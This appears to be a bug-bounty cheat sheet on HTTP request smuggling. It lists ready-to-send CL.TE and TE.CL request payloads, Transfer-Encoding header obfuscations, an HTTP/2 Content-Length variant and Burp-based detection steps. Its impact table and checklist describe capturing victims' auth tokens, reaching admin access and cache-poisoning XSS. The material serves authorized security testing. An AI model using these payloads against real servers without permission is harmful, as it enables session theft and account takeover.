# HTTP Request Smuggling

> Lowest dup rate. $5K–$30K. PortSwigger research by James Kettle.

## CL.TE (Content-Length Front-End, Transfer-Encoding Back-End)
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

## TE.CL (Transfer-Encoding Front-End, Content-Length Back-End)
```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0
```

## TE.TE (Both Support TE, Obfuscate to Disable One)
```http
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

## H2.CL (HTTP/2 Front-End with Content-Length Injection)
```
# In Burp Repeater, switch to HTTP/2
# Add Content-Length header manually (not auto-set by HTTP/2)
# Front-end ignores CL (HTTP/2 uses :content-length pseudo-header)
# Back-end uses CL → desync
```

## Detection (Burp)
```
1. Install HTTP Request Smuggler extension
2. Right-click request → Extensions → HTTP Request Smuggler → Smuggle probe
3. All four probe types automatically sent
4. ~10-second timeout on CL.TE probe = back-end waiting = CONFIRMED
```

## Impact Chain
| Chain | Result |
|-------|--------|
| Basic desync | Capture victim's next request → Read their auth token |
| + Admin user traffic | Access admin as victim |
| + Cache poisoning | Stored XSS at scale for all users |

## Testing Checklist
```
[ ] Test CL.TE, TE.CL, TE.TE, H2.CL
[ ] Use Burp HTTP Request Smuggler extension
[ ] Manual timing: CL.TE probe + ~10s delay = backend waiting
[ ] If confirmed: smuggle prefix to poison next request
[ ] Target admin/login endpoints for max impact
```